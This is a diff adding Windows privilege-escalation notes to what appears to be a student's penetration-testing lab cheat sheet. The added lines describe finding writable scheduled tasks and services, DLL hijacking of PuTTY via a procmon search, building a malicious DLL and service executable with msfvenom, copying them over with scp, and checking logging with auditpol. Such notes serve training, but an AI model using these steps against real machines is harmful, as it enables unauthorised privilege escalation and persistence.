@@ -300,12 +300,20 @@ can create more masters by using -M -S <specify a new folder> and -p if getting 
 scp -o "ControlPath=~/.ssh/cm/gray" placeholder:/home/student/func. can be used to run scp without even getting on the box
 MAKE SURE TO HAVE A PLACEHOLDER FOR THE USUAL USERNAME@IP
 
+====================== WINDOWS PRIVILEGE/PERSISTENCE/TRACKS ======================
 
+find vulnerable scheduled task using schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive |Select-String -Pattern "COM handler" -NotMatch
+then run icacls "C:\users\student\exercise2" to find a writable directory
+once a writable task is found open procmon and search for putty.exe NAME NOT FOUND to find a dll in the previously found writable directory to insert malicious code
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users||DemoAdmin\\Desktop\\whoami.txt' -f dll > WINMM.dll this recreates a dll thats found in Putty which opens a command line and runs whoami  
+honestly just use the FG like
+Dont have to do base64 encoding and use scp to move dll on to box
 
+can also check services to find services without descriptions/goofy descriptions that also have system privileges and try to rename the executable for said service
+copy this said executable with a new name and run msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users||DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z_up.exe
+once this is made again just scp it over 
 
-
-
-
+auditpol /get/category can show what is logged
 
 
 
